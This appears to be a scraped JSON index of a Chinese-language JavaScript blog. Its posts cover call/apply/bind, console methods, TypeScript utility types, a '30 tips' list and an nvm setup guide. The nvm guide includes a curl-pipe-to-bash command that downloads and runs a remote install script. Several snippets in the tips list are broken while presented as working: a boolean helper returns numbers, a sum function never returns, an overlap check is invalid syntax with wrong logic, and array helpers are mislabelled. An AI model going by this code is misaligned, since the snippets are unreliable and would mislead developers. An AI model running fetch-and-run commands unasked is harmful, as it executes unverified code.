\u0026gt; Your interest is Reading books 同一個例子的 call 與 apply 寫法比較 1 2 callName.call(person, 24, \u0026#39;Reading books\u0026#39;); callName.apply(person, [24, \u0026#39;Reading books\u0026#39;]); 修改 this 指向 和 .call() 一樣，.apply() 的第一個參數也是修改 this 指向的。 可能的錯誤 也許會碰到下面的錯誤提示信息：\n1 TypeError: CreateListFromArrayLike called on non-object 解決方案就是把參數打包成數組[]，進行傳遞。\n使用情境 function borrowing： 借用 function function borrowing 就是借別人函式中的方法來用的意思，下面示範 somebody 借用 person 的 getUserName 方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 const person = { userName: \u0026#39;Blueberry\u0026#39;, getUserName: function() { console.log(this.userName); } } const somebody = { userName: \u0026#39;Fan\u0026#39; } // with bind() const newUser = person.getUserName.bind(somebody); newUser(); // with call() person.getUserName.call(somebody); // with apply() person.getUserName.apply(somebody); output： 1 2 3 \u0026gt; Fan \u0026gt; Fan \u0026gt; Fan function currying： 拷貝 function function currying 的定義為建立一個函式的拷貝，並設定預設的參數，這在數學運算下很有用。下面我們就利用 bind 的特性來完成 function currying。\n1 2 3 4 5 6 const mutiply = function (a, b) { return a * b; } const mutiplyByTwo = mutiply.bind(this, 2); console.log(mutiplyByTwo(4)); output： 1 \u0026gt; 8 上面我們建立了一個函式 mutiply(a, b)，並用 bind 建立函式物件拷貝 mutiplyByTwo()。\nmutiply.bind(this, 2) 這邊的 this 並不重要，因為函式裡沒有使用到 this。\n而後面的 2 則是永久綁定了參數 a。\n為了讓程式碼比較好理解，這邊將上面那段程式碼拆解，它也等於：\n1 2 3 4 5 6 7 8 const mutiply = function (a) { return (b) =\u0026gt; { return a * b; } } const mutiplyByTwo = mutiply(2); console.log(mutiplyByTwo(4)); output： 1 \u0026gt; 8 ","date":"2022-11-09T00:00:00Z","image":"https://live.staticflickr.com/65535/52487952181_5991519a08_o.jpg","permalink":"https://wayneblog.ga/2022-11-09/js-call-apply-bind/","title":"使用 bind、call、apply 改變 this 指向的對象"},{"content":" 參考網站\n寫 JavaScript 需要檢視運作是否正確時候，都會使用 console.log 來檢視輸出或運算的值，而 console 的運用技巧不僅僅只有將值呈現在開發的 Console 介面中。本篇就來介紹許多 console 語法的實戰運用方法吧！\n首先，在此先準備一份等等會用到的物件及陣列作為以下範例使用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 const Ming = { name: \u0026#39;小明\u0026#39;, age: 15, favorite: \u0026#39;鍋燒意麵\u0026#39; } const Jay = { name: \u0026#39;杰倫\u0026#39;, age: 16, favorite: \u0026#39;炒麵\u0026#39; } const Auntie = { name: \u0026#39;漂亮阿姨\u0026#39;, age: 21, favorite: \u0026#39;蘿蔔糕\u0026#39; } const people = [Ming, Jay, Auntie]; 為 console.log 的程式碼上色 有在 Facebook 頁面中開啟過開發者工具嗎？如果有，相信你對於以下這張圖並不陌生。\nConsole 中的文字並非只有固定的色彩，它與網頁中的文字一樣，都可以透過 CSS 的語法來調整其色彩，只要在 log 的文字前方先加入 %c 後，在 , 後方的參數就能夠傳入 CSS 語法做為參數，並且調整 Console 中呈現的文字樣式。\n1 console.log(`%c ${Ming.name} 有瑟瑟的顏色`, \u0026#39;color: orange; font-size: 24px\u0026#39;); console.table()：使用表格的方式陳列陣列的資訊 當要呈現資料於 Console 介面中，做常見的方式就是使用 log 的方法：\n1 2 3 4 5 6 // 基本用法 console.log(Ming); console.log(Jay); console.log(Auntie); console.log(people); 當然，這樣的用法絕對沒有問題，透過此方法可以將值一一陳列出來，不過當這些數值是 具有關聯性 時，一般的 log 就無法比較兩者之間的關係。\nconsole.table() 針對物件之間有相同的屬性名稱時，就能夠輕易的比較相同屬性之間的關係。\n1 2 console.table([Ming, Jay, Auntie]); console.table(people); 除此之外，表格上方的標頭還可以點選作為排序使用，如果拿到一個 JSON 想比對其中的值，還要轉貼到 Excel 或是 sort() 語法安排，不如直接改用 table() 進行比較吧。\nconsole.group()：群組化大量的 log 資訊 使用 log() 觀看迴圈值是合情合理的，不過當陣列的長度有上百筆時，Console 介面中的資料還真會滾到令人厭世。\n1 2 3 4 for (let index = 0; index \u0026lt; people.length; index++) { const element = people[index]; console.log(element); } 在迴圈中使用 console.log() 會一一呈現資料，數量一多看起來就會顯的很吃力\n使用 console.group()、console.groupEnd() 設置群組的起訖，在 Console 的介面中就能方便的收合群組內容。\n1 2 3 4 5 6 console.group(\u0026#39;迴圈群組\u0026#39;); for (let index = 0; index \u0026lt; people.length; index++) { const element = people[index]; console.log(element); } console.groupEnd(); console.group(/* 群組名稱 */) 可以傳入 群組名稱 做為參數，作為在 Console 介面中辨識群組的顯示名稱，在介面中的群組名稱也會以粗體名稱，並且可以點擊箭頭符號收合群組內容。\nconsole.time()：開發者最愛斤斤計較那 1ms 的效能了 每當寫出神邏輯的時候，都會擔心電腦效能跟不上自己的思維，這時候就可以使用 time() 追蹤片段程式碼所處理的時間差，得知自己是不是該換台電腦解決問題。\n1 2 3 4 5 6 7 // 時間追蹤 console.time(\u0026#39;迴圈處理時間\u0026#39;); for (let index = 0; index \u0026lt; people.length; index++) { const element = people[index]; console.log(element); } console.timeEnd(\u0026#39;迴圈處理時間\u0026#39;); 在起訖中分別加入 time() 以及 timeEnd()，執行程式碼後就可以獲得處理的結果。\nconsole.dir()：以物件的形式呈現資料 1 2 3 // HTML \u0026lt;p\u0026gt;推薦的 Console 語法\u0026lt;/p\u0026gt; const p = document.querySelector(\u0026#39;p\u0026#39;); console.log(p); 當使用 console.log() 查看 DOM 元素，並想了解其中可用的方法或屬性時…，它可能會出現如下帶點失望的標籤，並且心裡默罵：\n要這個幹嘛啦 要知道的是物件屬性、屬性 這時候需要的是 console.dir()，你會發現另一個新世界，原本的 DOM 元素被改為物件的形式呈現，你可以輕鬆展開此物件，並檢視裡面有哪些可用屬性。\n1 2 const p = document.querySelector(\u0026#39;p\u0026#39;); console.dir(p); 展開的 P 元素，包含其中所有的屬性（這在操作 DOM 時極為好用）\nconsole.error() 寫程式有錯誤是難免的，但是如果是錯誤，卻沒有明確的提示導致沒有被發現問題，就失去提示的意義了，如果想讓 Console 的內容更加醒目，可以使用 console.error() 使訊息在 Console 介面中以錯誤的形式呈現。\n1 console.error(`${Ming.name} 你完蛋了`); 當運用在一般文字訊息上時，也可以展開訊息並說明錯誤來源自哪一段程式碼。\n在 AJAX 的未確認狀態中，也會使用 console.error 來呈現錯誤的回饋訊息，以下範例刻意將 API 路徑調整成錯誤的，並透過 console.error() 來將錯誤的資訊呈現在 Console 介面中\n1 2 3 4 5 6 // Error axios.get(\u0026#39;https://randomuser.me/apis\u0026#39;) .then((res) =\u0026gt; console.log(res)) .catch((error) =\u0026gt; { console.error(\u0026#39;待誌大條啦: \u0026#39;, error.response) }) console.warn() 錯誤太突兀了嗎？如果是自行開發的函式庫，已經透過各種形式避免程式碼出錯，但還是想把有錯誤的訊息給予開發者知道，那麼則可以使用 console.warn()。\n1 2 3 4 5 6 7 8 9 10 11 12 // Warning /*** * 超精美函式庫 💖 * @param {number} num 純數值 * @param {string} text 請傳入字串 */ function superMagicLibrary(num, text) { if (typeof num !== \u0026#39;number\u0026#39;) { console.warn(\u0026#39;尊重一下好嗎，請傳入純數值\u0026#39;) } } superMagicLibrary(\u0026#39;字串\u0026#39;); 函式庫中大多會避免已知的錯誤，如果要友善的給予回饋，可以使用 warn() 代替 error() 提醒開發者更好的做法。\nconsole.clear() 如果覺得 Console 介面已經充滿了許多不必要的資訊，想要專注於當前開發的程式碼，那麼可以加入 console.clear()。\n畫面中會出現 Console was cleared 的字眼\n此語法亦可在 Console 介面中直接輸入，會直接清除當下的所有資訊內容。\n不過請慎用此方法，如果隨意插入 console.clear() 在不同的檔案中，不知情的夥伴一定會在開發中卡很久，可能發生的情境有…：\n奇怪，我寫的 Code 怎麼都沒顯示在 Console 編譯器壞了嗎？怎麼好像沒有運作 我的 Chrome 怪怪的 還有哪些方法你也常用，但沒有介紹到的呢？歡迎在底下留言區留言喔\n","date":"2022-11-03T00:00:00Z","image":"https://live.staticflickr.com/65535/52473860621_0ede00e99a_o.jpg","permalink":"https://wayneblog.ga/2022-11-03/js-8-console-tricks/","title":"8 招 JavaScript Console 運用技巧，讓你除錯更高效"},{"content":" 參考網站\n很多人在平時的開發中使用到了 TypeScript，但是可能只是單純使用了一些基本的類型，但很多人不知道其實 TypeScript 自帶了很多非常方便的方法，接下來我就結合例子，給大家介紹一下這些很方便的方法。\nTypeScript 自帶的方法 Partial 作用 Partial 將類型的屬性變成可選\n例子 假如我現在有個 interface\n1 2 3 4 5 interface IUser1 { name: string; age: number; gender: number; } 有一天，我想把 IUser 身上的屬性都變成可選的，那我可能會再寫一個 interface\n1 2 3 4 5 interface IUser2 { name?: string; age?: number; gender?: number; } 但是如果屬性多了的話，我們又得寫很多額外的代碼，這個時候就可以直接用 Partial\n1 2 3 4 5 6 7 8 9 type IUser2 = Partial\u0026lt;IUser1\u0026gt; // 等同於 interface IUser2 { name?: string; age?: number; gender?: number; } 原理 1 2 3 type Partial\u0026lt;T\u0026gt; = { [P in keyof T]?: T[P]; }; Required 作用 Required 將類型的屬性變成必選\n例子 假如我現在有個 interface\n1 2 3 4 5 interface IUser1 { name: string; age?: number; gender?: number; } 可以看到有一些屬性是可選的，但是突然有一天，我想讓所有屬性變成必選我會再寫一個 interface\n1 2 3 4 5 interface IUser2 { name: string; age: number; gender: number } 但如果屬性多了的話，又要寫很多額外的代碼，這時候 Required 就派上用場了\n1 2 3 4 5 6 7 8 9 type IUser2 = Required\u0026lt;IUser1\u0026gt; // 等同於 interface IUser2 { name: string; age: number; gender: number } 原理 1 2 3 type Required\u0026lt;T\u0026gt; = { [P in keyof T]-?: T[P] }; Pick 作用 Pick 從某個類型中挑出一些屬性出來\n例子 假如我現在有個 interface\n1 2 3 4 5 interface IUser1 { name: string; age: number; gender: number; } 有一天我想要寫一個新 interface，它只擁有 age、gender 這兩個屬性，那我會重新寫一個 interface\n1 2 3 4 interface IUser2 { age: number; gender: number; } 但其實使用 Pick 非常方便去做這件事\n1 2 3 4 5 6 7 8 type IUser2 = Pick\u0026lt;IUser1, \u0026#39;age\u0026#39; | \u0026#39;gender\u0026#39;\u0026gt; // 等同於 interface IUser2 { age: number; gender: number; } 原理 1 2 3 type Pick\u0026lt;T, K extends keyof T\u0026gt; = { [P in K]: T[P]; }; Omit 作用 Omit\u0026lt;T, K extends keyof any\u0026gt; 的作用是使用 T 類型中除了 K 類型的所有屬性，來構造一個新的類型。\n例子 假如我現在有個 interface\n1 2 3 4 5 interface IUser1 { name: string; age: number; gender: number; } 有一天我想要寫一個新 interface，它只擁有 age、gender 這兩個屬性，那我會重新寫一個 interface\n1 2 3 4 interface IUser2 { age: number; gender: number; } 但其實使用 Omit 非常方便去做這件事\n1 2 3 4 5 6 7 8 type IUser2 = Omit\u0026lt;IUser1, \u0026#39;name\u0026#39;\u0026gt; // 等同於 interface IUser2 { age: number; gender: number; } 原理 1 type Omit\u0026lt;T, K extends keyof any\u0026gt; = Pick\u0026lt;T, Exclude\u0026lt;keyof T, K\u0026gt;\u0026gt;; NonNullable 作用 NonNullable 的作用是用來過濾類型中的 null 及 undefined 類型。\n例子 1 2 3 4 5 // string | number type T0 = NonNullable\u0026lt;string | number | undefined\u0026gt;; // string[] type T1 = NonNullable\u0026lt;string[] | null | undefined\u0026gt;; 原理 1 type NonNullable\u0026lt;T\u0026gt; = T extends null | undefined ? never : T; ReturnType 作用 ReturnType 的作用是用來得到一個函數的返回值類型。\n例子 假如我想定義一個變量來接受一個函數的返回值，但是不知道怎麼定義這個變量的類型，這個時候可以用 ReturnType\n1 2 3 4 5 6 type Func = (value: number) =\u0026gt; string; let str: ReturnType\u0026lt;Func\u0026gt;; const fun: Func = (value: number) =\u0026gt; String(value) str = fun(1) 原理 1 2 type ReturnType\u0026lt;T extends (...args: any[]) =\u0026gt; any\u0026gt; = T extends (...args: any[]) =\u0026gt; infer R ? R : any; Exclude 作用 Exclude\u0026lt;T, U\u0026gt; 的作用是將某個類型中屬於另一個的類型移除掉。\n例子 1 2 3 4 5 type T0 = Exclude\u0026lt;\u0026#34;a\u0026#34; | \u0026#34;b\u0026#34; | \u0026#34;c\u0026#34;, \u0026#34;a\u0026#34;\u0026gt;; // \u0026#34;b\u0026#34; | \u0026#34;c\u0026#34; type T1 = Exclude\u0026lt;\u0026#34;a\u0026#34; | \u0026#34;b\u0026#34; | \u0026#34;c\u0026#34;, \u0026#34;a\u0026#34; | \u0026#34;b\u0026#34;\u0026gt;; // \u0026#34;c\u0026#34; type T2 = Exclude\u0026lt;string | number | (() =\u0026gt; void), Function\u0026gt;; // string | number 原理 1 type Exclude\u0026lt;T, U\u0026gt; = T extends U ? never : T; Record 作用 Record\u0026lt;K extends keyof any, T\u0026gt; 的作用是將 K 中所有的屬性的值轉化爲 T 類型。\n例子 1 2 3 4 5 6 7 8 9 10 11 interface PageInfo { title: string; } type Page = \u0026#34;home\u0026#34; | \u0026#34;about\u0026#34; | \u0026#34;contact\u0026#34;; const x: Record\u0026lt;Page, PageInfo\u0026gt; = { about: { title: \u0026#34;about\u0026#34; }, contact: { title: \u0026#34;contact\u0026#34; }, home: { title: \u0026#34;home\u0026#34; }, }; 原理 1 2 3 type Record\u0026lt;K extends keyof any, T\u0026gt; = { [P in K]: T; }; Readonly 作用 Readonly 的作用是將某個類型所有屬性變爲只讀屬性，也就意味着這些屬性不能被重新賦值。\n例子 1 2 3 4 5 6 7 8 9 10 interface Todo { title: string; } const todo: Readonly\u0026lt;Todo\u0026gt; = { title: \u0026#34;Delete inactive users\u0026#34; }; todo.title = \u0026#34;Hello\u0026#34;; // Error: cannot reassign a readonly property 原理 1 2 3 type Readonly\u0026lt;T\u0026gt; = { readonly [P in keyof T]: T[P]; }; ","date":"2022-10-28T00:00:00Z","image":"https://live.staticflickr.com/65535/52459954880_4228a13922_o.png","permalink":"https://wayneblog.ga/2022-10-28/ts-useful-tricks/","title":"TypeScript 的實用方法！大家一定要學會啊！"},{"content":" 參考網站\n參考網站\n最近重溫了一遍紅寶書，發現一些比較好玩的寫法，很多東西日常都在用，但是發現還會有不一樣的寫法, 結合一些日常工作中使用的方法，爲大家總結一篇日常經常使用可能還不知道的點，希望對你能有所幫助。\n一行代碼完成結構加賦值 我們日常經常使用結構賦值，一般都是先結構，再賦值，當然我們也可以一行就完成解構加賦值操作，看起來非常簡化，當然可讀性你懂得！\n1 2 3 4 5 let people = { name: null, age: null }; let result = { name: \u0026#39;張三\u0026#39;, age: 16 }; ({ name: people.name, age: people.age} = result); console.log(people) // {\u0026#34;name\u0026#34;:\u0026#34;張三\u0026#34;,\u0026#34;age\u0026#34;:16} 對基礎數據類型進行解構 日常中我們應該用不到這樣的場景，但是實際上我們也可以對基礎數據類型解構。\n1 2 const {length : a} = \u0026#39;1234\u0026#39;; console.log(a) // 4 對數組解構快速拿到最後一項值 實際上我們是可以對數組解構賦值拿到 length 屬性的，通過這個特性也可以做更多的事情。\n1 2 3 4 5 const arr = [1, 2, 3]; const { 0: first, length, [length - 1]: last } = arr; first; // 1 last; // 3 length; // 3 將下標轉爲中文零一二三\u0026hellip; 日常可能有的列表我們需要將對應的 012345 轉爲中文的一、二、三、四、五\u0026hellip;，在老的項目看到還有通過自己手動定義很多行這樣的寫法，於是寫了一個這樣的方法轉換\n1 2 3 4 5 6 export function transfromNumber(number){ const INDEX_MAP = [\u0026#39;零\u0026#39;，\u0026#39;一\u0026#39;.....] if(!number) return if(number === 10) return INDEX_MAP[number] return [...number.toString()].reduce( (pre, cur) =\u0026gt; pre + INDEX_MAP[cur] , \u0026#39;\u0026#39; ) } 判斷整數的不同方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /* 1. 任何整數都會被1整除，即餘數是0。利用這個規則來判斷是否是整數。但是對字符串不準確 */ function isInteger(obj) { return obj % 1 === 0 } /* 1. 添加一個是數字的判斷 */ function isInteger(obj) { return typeof obj === \u0026#39;number\u0026#39; \u0026amp;\u0026amp; obj % 1 === 0 } /* 2. 使用Math.round、Math.ceil、Math.floor判斷 整數取整後還是等於自己。利用這個特性來判斷是否是整數*/ function isInteger(obj) { return Math.floor(obj) === obj } /* 3. 通過parseInt判斷 某些場景不準確 */ function isInteger(obj) { return parseInt(obj, 10) === obj } /* 4. 通過位運算符*/ function isInteger(obj) { return (obj | 0) === obj } /* 5.ES6提供了Number.isInteger */ 通過 css 檢測系統的主題色從而全局修改樣式 @media 的屬性 prefers-color-scheme 就可以知道當前的系統主題，當然使用前需要查查兼容性。\n1 2 @media (prefers-color-scheme: dark) { //... } @media (prefers-color-scheme: light) { //... } javascript 也可以輕鬆做到\n1 2 3 4 5 6 7 8 window.addEventListener(\u0026#39;theme-mode\u0026#39;, event =\u0026gt;{ if(event.mode == \u0026#39;dark\u0026#39;){} if(event.mode == \u0026#39;light\u0026#39;){} }) window.matchMedia(\u0026#39;(prefers-color-scheme: dark)\u0026#39;) .addEventListener(\u0026#39;change\u0026#39;, event =\u0026gt; { if (event.matches) {} // dark mode }) 數組隨機打亂順序 通過 0.5-Math.random() 得到一個隨機數，再通過兩次 sort 排序打亂的更徹底, 但是這個方法實際上並不夠隨機，如果是企業級運用，建議使用第二種洗牌算法。\n1 2 3 function shuffle(arr) { return arr.sort(() =\u0026gt; 0.5 - Math.random()). sort(() =\u0026gt; 0.5 - Math.random()); } 1 2 3 4 5 6 7 function shuffle(arr) { for (let i = arr.length - 1; i \u0026gt; 0; i--) { const randomIndex = Math.floor(Math.random() * (i + 1)) ;[arr[i], arr[randomIndex]] = [arr[randomIndex], arr[i]] } return arr } 隨機獲取一個 Boolean 值 和上個原理相同，通過隨機數獲取，Math.random() 的區間是 0-0.99，用 0.5 在中間百分之五十的概率。\n1 2 3 function randomBool() { return 0.5 - Math.random() } 把數組最後一項移到第一項 1 2 3 function (arr){ return arr.push(arr.shift()); } 把數組的第一項放到最後一項 1 2 3 function(arr){ return arr.unshift(arr.pop()); } 利用 set 數組去重 1 2 3 function uniqueArr(arr){ return [...new Set(arr)] } dom 節點平滑滾動到可視區域、頂部、底部 原生的 scrollTo 方法沒有動畫，類似於錨點跳轉，比較生硬，可以通過這個方法會自帶平滑的過度效果。\n1 2 3 4 5 6 7 8 9 10 function scrollTo(element) { // 頂部 element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;, block: \u0026#34;start\u0026#34; }) // 底部 element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;, block: \u0026#34;end\u0026#34; }) // 可視區域 element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;}) } 獲取隨機顏色 日常我們經常會需要獲取一個隨機顏色，通過隨機數即可完成。\n1 2 3 function getRandomColor(){ return `#${Math.floor(Math.random() * 0xffffff) .toString(16)}`; } 檢測是否爲空對象 通過使用 ES6 的 Reflect 靜態方法判斷他的長度就可以判斷是否是空數組了，也可以通過 Object.keys() 來判斷。\n1 2 3 function isEmpty(obj){ return Reflect.ownKeys(obj).length === 0 \u0026amp;\u0026amp; obj.constructor === Object; } Boolean 轉換 一些場景下我們會將 boolean 值定義爲場景，但是在 js 中非空的字符串都會被認爲是 true。\n1 2 3 4 5 6 7 function toBoolean(value, truthyValues = [\u0026#39;true\u0026#39;]){ const normalizedValue = String(value).toLowerCase().trim(); return truthyValues.includes(normalizedValue); } toBoolean(\u0026#39;TRUE\u0026#39;); // true toBoolean(\u0026#39;FALSE\u0026#39;); // false toBoolean(\u0026#39;YES\u0026#39;, [\u0026#39;yes\u0026#39;]); // true 各種數組複製方法 數組克隆的方法其實特別多了，看看有沒有你沒見過的！\n1 2 3 4 5 6 7 const clone = (arr) =\u0026gt; arr.slice(0); const clone = (arr) =\u0026gt; [...arr]; const clone = (arr) =\u0026gt; Array.from(arr); const clone = (arr) =\u0026gt; arr.map((x) =\u0026gt; x); const clone = (arr) =\u0026gt; JSON.parse(JSON.stringify(arr)); const clone = (arr) =\u0026gt; arr.concat([]); const clone = (arr) =\u0026gt; structuredClone(arr); 比較兩個時間大小 通過調用 getTime 獲取時間戳比較就可以了。\n1 2 3 function compare(a, b){ return a.getTime() \u0026gt; b.getTime(); } 計算兩個時間之間的月份差異 1 2 3 function monthDiff(startDate, endDate){ return Math.max(0, (endDate.getFullYear() - startDate.getFullYear()) * 12 - startDate.getMonth() + endDate.getMonth()); } 一步驟從時間中提取年月日時分秒 時間格式化輕鬆解決，一步驟獲取到年月日時分秒毫秒，由於 toISOString 會丟失時區，導致時間差八小時，所以在格式化之前我們加上八個小時時間即可。\n1 2 3 4 5 6 function extract(date){ const d = new Date(new Date(date).getTime() + 8*3600*1000); return new Date(d).toISOString().split(/[^0-9]/).slice(0, -1); } console.log(extract(new Date())) // [\u0026#39;2022\u0026#39;, \u0026#39;09\u0026#39;, \u0026#39;19\u0026#39;, \u0026#39;18\u0026#39;, \u0026#39;06\u0026#39;, \u0026#39;11\u0026#39;, \u0026#39;187\u0026#39;] 判斷一個參數是不是函數 有時候我們的方法需要傳入一個函數回調，但是需要檢測其類型，我們可以通過 Object 的原型方法去檢測，當然這個方法可以準確檢測任何類型。\n1 2 3 function isFunction(v){ return [\u0026#39;[object Function]\u0026#39;, \u0026#39;[object GeneratorFunction]\u0026#39;, \u0026#39;[object AsyncFunction]\u0026#39;, \u0026#39;[object Promise]\u0026#39;].includes(Object.prototype.toString.call(v)); } 計算兩個座標之間的距離 1 2 3 function distance(p1, p2){ return `Math.sqrt(Math.pow(p2.x - p1.x, 2) + Math.pow(p2.y - p1.y, 2)); } 檢測兩個 dom 節點是否覆蓋重疊 有些場景下我們需要判斷 dom 是否發生碰撞了或者重疊了，我們可以通過 getBoundingClientRect 獲取到 dom 的 x1、y1、x2、y2 座標然後進行座標比對即可判斷出來。\n1 2 3 function overlaps = (a, b) { return (a.x1 \u0026lt; b.x2 \u0026amp;\u0026amp; b.x1 \u0026lt; a.x2) || (a.y1 \u0026lt; b.y2 \u0026amp;\u0026amp; b.y1 \u0026lt; a.y2); } 判斷是否是 Nodejs 環境 前端的日常開發是離不開 nodejs 的，通過判斷全局環境來檢測是否是 nodejs 環境。\n1 2 3 function isNode(){ return typeof process !== \u0026#39;undefined\u0026#39; \u0026amp;\u0026amp; process.versions != null \u0026amp;\u0026amp; process.versions.node != null; } 參數求和 之前看到有通過函數柯理化形式來求和的，通過 reduce 一行即可。\n1 2 3 function sum(...args){ args.reduce((a, b) =\u0026gt; a + b); } ","date":"2022-10-27T00:00:00Z","image":"https://live.staticflickr.com/65535/52457807569_15f64548d9_o.jpg","permalink":"https://wayneblog.ga/2022-10-27/js-30-keypoints/","title":"30 個 Javascript 知識點總結，總有你不會的！"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n參考網站\nnvm 是 Node.js 的版本管理器 (version manager)，可在同一台主機上安裝多個版本的 Node.js 環境，因為不同專案可能會使用不同的 Node.js 版本，那就需要透過一個版本管理器來切換不同的 Node.js 版本。\n安裝 NVM 接下來到 NVM 的 GitHub 儲存庫下載，無論你是 Windows、MacOS、Unix 系統都有對應的安裝方式。\nWindows NVM for Windows 有提供安裝工具，下載後照著安裝精靈依序完成即可運作，下載連結。\n請選擇 nvm-setup 下載並安裝\n下載後依循著安裝精靈即可完成。\n完成後，打開「命令提示字元」可以試著輸入 nvm，如果看到類似以下畫面就算是完成了。\nMacOS MacOS 則是使用指令進行安裝，打開「終端機」或自行安裝的「iTerm」等工具，輸入以下指令即可開始安裝，（更多版本連結）。\n1 curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash 安裝後預期會顯示以下片段及算安裝完成，而此時如果你有安裝其它指令工具，有可能會發生輸入 nvm 無法呼叫的狀況（例如：zsh: command not found: nvm）。\n接下來可以在你所使用的命令設定檔案加入以下片段程式碼，以下提供 bash、zsh 的說明，兩者依據環境選擇其一即可：\nbash(預設) zsh bash 預設的情況下，MacOS 中可能沒有任何一個指令設定檔案，此時可以使用 touch ~/.bash_profile 新增一個文字檔案在根目錄上，接下來回到資料根目錄可以找到 .bash_profile，沒看到的話代表未開啟隱藏檔案顯示，可以按下 Command + Shift+ . 顯示。\n接下來使用任何文字編輯器打開該檔案，並加入以下程式碼存檔即可。\n1 2 3 export NVM_DIR=\u0026#34;$HOME/.nvm\u0026#34; [ -s \u0026#34;$NVM_DIR/nvm.sh\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/nvm.sh\u0026#34; # This loads nvm [ -s \u0026#34;$NVM_DIR/bash_completion\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/bash_completion\u0026#34; # This loads nvm bash_completion zsh 可以打開 .zshrc 加入以下片段後重啟（注意：.zshrc 通常在使用者根目錄下並且為隱藏檔，找到後使用任何文字編輯器打開編輯）。\n1 2 3 export NVM_DIR=\u0026#34;$HOME/.nvm\u0026#34; [ -s \u0026#34;$NVM_DIR/nvm.sh\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/nvm.sh\u0026#34; # This loads nvm [ -s \u0026#34;$NVM_DIR/bash_completion\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/bash_completion\u0026#34; # This loads nvm bash_completion 設定完成以後，按下 nvm 就會跳出如下圖就算完成了。\n注意：\n使用 nvm 時，不需要 sudo 即可使用 npm -g 全域安裝模組，所以與其執行 sudo npm i -g，不如執行 npm i -g 若你有 ~/.npmrc，請確保裡面不包含任何 prefix 的設定 (因為與 nvm 不相容) 你可以 (但不應該) 保留以前在 \u0026ldquo;系統\u0026rdquo; 安裝的 Node.js，但 nvm 只對你的使用者帳戶 (用於安裝 nvm 的使用者帳戶) 可用。可能會導致版本不 match，因為其他使用者會使用 /usr/local/lib/node_modules/*，而使用者帳戶會使用 ~/.nvm/versions/node/vX.X.X/lib/node_modules/* 常用的 NVM 指令 直接輸入 nvm 及可以看到所有的指令列表，在此僅列出最常見的幾個指令（基本上常用的只有兩三個，剩下幾個只要認識即可）\nversion：確認 NVM 是否安裝成功 (alias：v) Usage： 1 2 3 nvm version # or nvm v 查看 NVM 的版本 1 2 $ nvm v 1.1.9 install：利用 NVM 安裝 Node.js Usage： 1 2 3 4 5 6 nvm install # or # {version} 欲安裝的 Node.js 版本 # {arch} 欲安裝的 system arch：32、64、\u0026#34;all\u0026#34; (預設為當前系統) nvm install \u0026lt;version\u0026gt; [arch] 安裝 NVM 後，其實還沒安裝 Node 環境：\n1 2 $ node zsh: command not found: node 如果執行下面指令，會提醒你需要執行 install 指令才能安裝 Node.js：\n1 2 3 4 $ nvm use node N/A: version \u0026#34;node -\u0026gt; N/A\u0026#34; is not yet installed. You need to run \u0026#34;nvm install node\u0026#34; to install it before using it. 安裝最新版的 Node.js：\n1 2 3 4 5 6 7 8 $ nvm install node Downloading and installing node v12.8.1... Downloading https://nodejs.org/dist/v12.8.1/node-v12.8.1-linux-x64.tar.xz... #################################################################################################### 100.0% Computing checksum with sha256sum Checksums matched! Now using node v12.8.1 (npm v6.10.2) Creating default alias: default -\u0026gt; node (-\u0026gt; v12.8.1) 如果要指定安裝版本，可以直接指定版本號 1 $ nvm install 16.18.0 安裝的第一個版本的 Node.js 會成為 nvm 的預設版本，新的 shell 就會以預設版本的 Node.js 來使用 (例如：nvm alias default)。\n查看目前安裝 Node.js 的版本：\n1 2 $ node -v v16.18.0 uninstall：利用 NVM 解除安裝指定的 Node.js 版本 Usage： 1 nvm uninstall \u0026lt;version\u0026gt; list：查看可用的安裝版本 (alias：ls) Usage： 1 2 3 nvm list # or nvm ls nvm list：查看已安裝的版本 nvm list installed：查看已安裝的版本 nvm list available：查看遠端可安裝的版本 查看目前 Node.js 有哪些可用版本可安裝 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 $ nvm ls available | CURRENT | LTS | OLD STABLE | OLD UNSTABLE | |--------------|--------------|--------------|--------------| | 19.0.0 | 18.12.0 | 0.12.18 | 0.11.16 | | 18.11.0 | 16.18.0 | 0.12.17 | 0.11.15 | | 18.10.0 | 16.17.1 | 0.12.16 | 0.11.14 | | 18.9.1 | 16.17.0 | 0.12.15 | 0.11.13 | | 18.9.0 | 16.16.0 | 0.12.14 | 0.11.12 | | 18.8.0 | 16.15.1 | 0.12.13 | 0.11.11 | | 18.7.0 | 16.15.0 | 0.12.12 | 0.11.10 | | 18.6.0 | 16.14.2 | 0.12.11 | 0.11.9 | | 18.5.0 | 16.14.1 | 0.12.10 | 0.11.8 | | 18.4.0 | 16.14.0 | 0.12.9 | 0.11.7 | | 18.3.0 | 16.13.2 | 0.12.8 | 0.11.6 | | 18.2.0 | 16.13.1 | 0.12.7 | 0.11.5 | | 18.1.0 | 16.13.0 | 0.12.6 | 0.11.4 | | 18.0.0 | 14.20.1 | 0.12.5 | 0.11.3 | | 17.9.1 | 14.20.0 | 0.12.4 | 0.11.2 | | 17.9.0 | 14.19.3 | 0.12.3 | 0.11.1 | | 17.8.0 | 14.19.2 | 0.12.2 | 0.11.0 | | 17.7.2 | 14.19.1 | 0.12.1 | 0.9.12 | | 17.7.1 | 14.19.0 | 0.12.0 | 0.9.11 | | 17.7.0 | 14.18.3 | 0.10.48 | 0.9.10 | 通常會選擇安裝 LTS (Long-term support，長期支援) 版\n查看目前已安裝的版本 1 2 3 $ nvm ls * 16.18.0 (Currently using 64-bit executable) 14.18.0 use：切換 Node.js 版本 Usage： 1 2 3 4 5 6 nvm use # or # {version} 欲切換的 Node.js 版本 # {arch} 欲切換的 system arch：32、64、\u0026#34;all\u0026#34; (預設為當前系統) nvm use \u0026lt;version\u0026gt; [arch] 如果要使用 